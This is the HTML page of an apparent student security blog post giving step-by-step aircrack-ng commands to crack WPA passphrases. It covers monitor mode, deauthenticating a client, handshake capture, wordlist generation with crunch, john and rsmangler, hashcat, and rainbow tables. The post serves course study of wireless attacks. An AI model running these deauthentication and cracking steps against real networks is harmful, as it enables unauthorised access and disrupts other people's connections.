@@ -1,0 +1,598 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>WPA cracking with aircrack-ng - creep33.github.io</title>
+<meta name="description" content="En este post se describe como realizar un ataque a WPA utilizando aircrack-ng desde poner la tarjeta en modo monitor hasta comprobar si la contraseña extraída es válida o es una autenticación errónea del usuario.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="creep33.github.io">
+<meta property="og:title" content="WPA cracking with aircrack-ng">
+<meta property="og:url" content="http://localhost:4000/WPA-Cracking-With-Aircrack/">
+
+
+  <meta property="og:description" content="En este post se describe como realizar un ataque a WPA utilizando aircrack-ng desde poner la tarjeta en modo monitor hasta comprobar si la contraseña extraída es válida o es una autenticación errónea del usuario.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/Wireless/aircrack-icon.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-05-11T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/WPA-Cracking-With-Aircrack/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "creep33",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="creep33.github.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">WPA cracking with aircrack-ng</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="creep33" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">creep33</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cibersecurity and<br>Ethical Hacking Student
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/creep33" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="WPA cracking with aircrack-ng">
+    <meta itemprop="description" content="En este post se describe como realizar un ataque a WPA utilizando aircrack-ng desde poner la tarjeta en modo monitor hasta comprobar si la contraseña extraída es válida o es una autenticación errónea del usuario.">
+    <meta itemprop="datePublished" content="May 11, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">WPA cracking with aircrack-ng
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-05-11T00:00:00+02:00">May 11, 2022 </time>&emsp;
+          
+          
+        </p>
+        <h1 id="getting-a-handshake">Getting a handshake</h1>
+<h2 id="set-interface-to-monitor-mode">Set interface to monitor mode</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airmon-ng check <span class="nb">kill
+</span>airmon-ng start wlan0
+</code></pre></div></div>
+
+<h2 id="choose-a-target">Choose a target</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng wlan0mon
+</code></pre></div></div>
+
+<p>We will choose a target who has <strong>PSK</strong> auth method, and we will store the <strong>chanel</strong>, the <strong>bssid</strong> the <strong>essid</strong> and a <strong>client bssid</strong>.</p>
+
+<p>Example target:</p>
+<ul>
+  <li>ESSID: wifu</li>
+  <li>BSSID: 34:08:04:09:3D:38</li>
+  <li>Channel: 3</li>
+  <li>Client BSSID: 00:18:4D:1D:A8:1F</li>
+</ul>
+
+<p><img src="/assets/images/Wireless/Airodump-ng_example.png" alt="Airodump-ng_example" /></p>
+
+<h2 id="prepare-our-capture-scenario">Prepare our capture scenario.</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-c</span> 3 <span class="nt">--essid</span> wifu <span class="nt">--bssid</span> 34:08:04:09:3D:38 <span class="nt">-w</span> wpa wlan0mon
+</code></pre></div></div>
+
+<p>We will store the capture into “wpa.*” files.</p>
+
+<h2 id="deathenticate-a-client">Deathenticate a client</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aireplay-ng <span class="nt">-0</span> 1 <span class="nt">-a</span> 34:08:04:09:3D:38 <span class="nt">-c</span> 00:18:4D:1D:A8:1F wlan0mon
+</code></pre></div></div>
+
+<h3 id="troubleshooting">Troubleshooting</h3>
+<ul>
+  <li>Some wireless drivers ignore directed deauthentication and only respond to broadcast deauthentication. We can run the same aireplay-ng deauthentication command without the -c parameter.</li>
+</ul>
+
+<h2 id="cracking-hash">Cracking Hash</h2>
+<p>Once the client reconnects with the target AP, airodump-ng will be able to capture a handshake.</p>
+
+<p><img src="/assets/images/Wireless/HandShake.png" alt="HandShake" /></p>
+
+<p>Before terminating airodump-ng with <code class="language-plaintext highlighter-rouge">&lt;ctrl&gt;+c</code>, let’s continue to capture traffic between the client and the AP. This additional data will assist us in confirming the key is correct later on.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aircrack-ng <span class="nt">-w</span> /usr/share/john/password.lst <span class="nt">-e</span> wifu <span class="nt">-b</span> 34:08:04:09:3D:38 wpa-01.cap
+</code></pre></div></div>
+
+<h3 id="troubleshooting-1">Troubleshooting</h3>
+<ul>
+  <li>If 802.11w is in use, unencrypted deauthentication frames are ignored. The only course of action is to wait for a client to connect.</li>
+  <li>The device simply didn’t reconnect or was already out of range of the AP.</li>
+</ul>
+
+<h2 id="verifying-its-validity">Verifying its validity</h2>
+<p>Aircrack-ng successfully cracked our easy passphrase. However, we should confirm it is correct. It is possible that we captured a client’s unsuccessful attempt to connect to the network. This is where we make use of the additional traffic we captured between the client and the AP.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airdecap-ng <span class="nt">-b</span> 34:08:04:09:3D:38 <span class="nt">-e</span> wifu <span class="nt">-p</span> 12345678 wpa-01.cap
+</code></pre></div></div>
+<p>(Obviously the -p parameter if for the cracked passphrase)</p>
+
+<p>Our results show airdecap-ng successfully decrypted 37 packets. In some cases, where there is a pause in decryptable traffic, airdecap-ng may indicate “0” even if the passphrase is correct.</p>
+
+<h3 id="troubleshooting-2">Troubleshooting</h3>
+<ul>
+  <li>
+    <p>Another way we can confirm our passphrase is to use Wireshark and add it to a capture as described in the Wireshark module.</p>
+  </li>
+  <li>
+    <p>Another option is to capture another handshake with airodump-ng and capture more follow-on traffic. We may be able to just capture traffic between the same client and AP, then combine both capture files if little time has elapsed. Rekeying can happen up to an hour after initial handshake.</p>
+  </li>
+</ul>
+
+<h1 id="custom-wordlists-to-crack">Custom wordlists to crack</h1>
+<h2 id="search-for-router-default-patterns">Search for router default patterns</h2>
+<p>It is rare to know an AP’s model prior to an engagement, but we can determine some information about the device’s manufacturer from its <a href="https://portal.offensive-security.com/courses/pen-210/books-and-videos/modal/modules/cracking-authentication-hashes/custom-wordlists-with-aircrack-ng/custom-wordlists-with-aircrack-ng#fn3">IEEE <em>Organizationally Unique Identifier</em> (OUI)</a>. To do this, we’ll look in the first three bytes of the BSSID.</p>
+
+<h2 id="expand-wordlists">Expand wordlists</h2>
+<p>In addition to all of this, there are many tools that can mangle and expand our wordlists. We will focus on three popular ones.</p>
+
+<ul>
+  <li><em>John the Ripper</em>, also known as John or abbreviated as JtR</li>
+  <li><em>Crunch</em></li>
+  <li><em>RSMangler</em></li>
+</ul>
+
+<p>While all of these tools will mangle words, Crunch is a bit different because it is mostly used to create wordlists from scratch. The capabilities of these tools also overlap, and two tools often can achieve the same result. It’s likely that the tool we choose will depend on personal preference.</p>
+
+<h2 id="pipe-john-rules-to-aircrack-ng">Pipe John rules to aircrack-ng</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/john/password.lst <span class="nt">--rules</span> <span class="nt">--stdout</span> | aircrack-ng <span class="nt">-e</span> wifu <span class="nt">-w</span> - wpa-02.cap
+</code></pre></div></div>
+
+<h2 id="aircrack-ng-with-crunch">Aircrack-ng with CRUNCH</h2>
+<h3 id="crunch-usage">Crunch usage</h3>
+<p>Given a pattern and a character set or words, Crunch is able to generate all possible combinations.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 8 9 abc123
+</code></pre></div></div>
+<p>(Because it is 58TB long, we short the output just with the characters “abc123”)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 11 11 <span class="nt">-t</span> Password%%%
+</code></pre></div></div>
+<p>(Generate an 11 lenght password + 3 numbers dictionary)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 1 1 <span class="nt">-p</span> dog <span class="nb">cat </span>house 
+</code></pre></div></div>
+<p>(Generate an all combinations of theese words wordlist)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 5 5 <span class="nt">-t</span> ddd%% <span class="nt">-p</span> dog <span class="nb">cat </span>bird
+</code></pre></div></div>
+<p>(Generate an all combinations of theese words wordlist and add 2 numbers)</p>
+
+<h3 id="pipe-wordlists-to-aircrack">Pipe wordlists to aircrack</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 11 11 <span class="nt">-t</span> Password%% | aircrack-ng <span class="nt">-e</span> wifu wpa-02.cap <span class="nt">-w</span> - 
+</code></pre></div></div>
+
+<h2 id="aircrack-ng-with-rsmangler">Aircrack-ng with RSMangler</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rsmangler <span class="nt">--file</span> wordlist.txt <span class="nt">--min</span> 12 <span class="nt">--max</span> 13 | aircrack-ng <span class="nt">-e</span> wifu wpa-03.cap <span class="nt">-w</span> - 
+</code></pre></div></div>
+
+<h1 id="cracking-hash-with-hashcat">Cracking hash with Hashcat</h1>
+<p>We need to transform the cap file int o a hccapx.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>hashcat-utils
+cap2hccapx wifu-01.cap output.hccapx
+hashcat <span class="nt">-m</span> 2500 output.hccapx /usr/share/john/password.lst
+</code></pre></div></div>
+
+<h1 id="airolib-ng-rt">Airolib-ng (RT)</h1>
+<p>Airolib-ng is a tool designed to store and manage ESSID and password lists, compute their Pairwise Master Keys (PMK), and use them in order to crack WPA and WPA2 PSK passphrases. It uses the lightweight <em>SQLite3</em> database as its storage mechanism, which is available on most platforms. (Rainbow tables)</p>
+
+<h2 id="file-with-the-essid">File with the ESSID</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>wifu <span class="o">&gt;</span> essid.txt
+</code></pre></div></div>
+
+<h2 id="importing-essid-into-airolib-ng-db">Importing ESSID into airolib-ng db</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airolib-ng wifu.sqlite <span class="nt">--import</span> essid essid.txt
+</code></pre></div></div>
+
+<h2 id="displaying-stored-info">Displaying stored info</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airolib-ng wifu.sqlite <span class="nt">--stats</span>
+</code></pre></div></div>
+
+<h2 id="import-passwords-dict">Import passwords dict</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airolib-ng wifu.sqlite <span class="nt">--import</span> passwd /usr/share/john/password.lst
+</code></pre></div></div>
+
+<h2 id="compute">Compute</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airolib-ng wifu.sqlite <span class="nt">--batch</span>
+</code></pre></div></div>
+
+<h2 id="displaying-stored-info-1">Displaying stored info</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airolib-ng wifu.sqlite <span class="nt">--stats</span>
+</code></pre></div></div>
+
+<h2 id="cracking-with-a-db-in-aircrack-ng">Cracking with a DB in aircrack-ng</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aircrack-ng <span class="nt">-r</span> wifu.sqlite wpa1-01.cap
+</code></pre></div></div>
+
+<h1 id="cowpatty-rt">coWPAtty (RT)</h1>
+<h2 id="generating-the-rainbow-table">Generating the Rainbow Table</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>genpmk <span class="nt">-f</span> /usr/share/john/password.lst <span class="nt">-s</span> wifu <span class="nt">-d</span> wifuhashes 
+</code></pre></div></div>
+<p>(Where wifu is the ESSID, and wifuhashes the outputfile)</p>
+
+<h2 id="cracking-with-cowpatty">Cracking with cowpatty</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cowpatty <span class="nt">-r</span> wpajohn-01.cap <span class="nt">-s</span> wifu <span class="nt">-d</span> wifuhashes
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#aircrack-ng" class="page__taxonomy-item" rel="tag">Aircrack-ng</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cli" class="page__taxonomy-item" rel="tag">CLI</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#wifi-hacking" class="page__taxonomy-item" rel="tag">Wifi Hacking</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#wpa" class="page__taxonomy-item" rel="tag">WPA</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#wifi" class="page__taxonomy-item" rel="tag">Wifi</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-05-11T00:00:00+02:00">May 11, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Joomla/" class="pagination--pager" title="Joomla
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 creep33</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
